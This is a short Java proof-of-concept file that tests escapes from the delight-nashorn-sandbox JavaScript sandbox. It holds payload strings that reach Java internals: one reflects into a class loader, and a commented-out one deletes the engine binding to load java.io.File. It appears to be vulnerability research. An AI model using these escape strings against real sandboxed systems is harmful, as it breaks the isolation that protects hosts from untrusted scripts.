package com.SugarP1g.nashorn;

import delight.nashornsandbox.NashornSandbox;
import delight.nashornsandbox.NashornSandboxes;
import delight.nashornsandbox.internal.InterruptTest;

import javax.script.ScriptException;

public class POC {

    // 1s
    private static final int MAX_CPU_TIME = 1000;
    // 5G
    private static final long MAX_MEMORY_SIZE = 1024 * 1024 * 1024 * 5L;

    private static final int CORE_POOL_SIZE = 2;

    private static final int MAX_POOL_SIZE = 5;

    private static final int QUEUE_SIZE = 1000;

    public static void main(String[] args) throws ScriptException {
        String js = "";
        NashornSandbox sandbox = NashornSandboxes.create();
//        sandbox.setMaxCPUTime(MAX_CPU_TIME);
//        sandbox.setMaxMemory(MAX_MEMORY_SIZE);
        // sandbox.eval(js);
        // sandbox.eval("delete this.engine; this.engine.factory.scriptEngine.compile('var File = Java.type(\"java.io.File\"); File;').eval()");
        sandbox.eval("var test = Java.type(\"delight.nashornsandbox.internal.InterruptTest\");Reflect.get(test.class, 'getClassLoader');");
    }
}
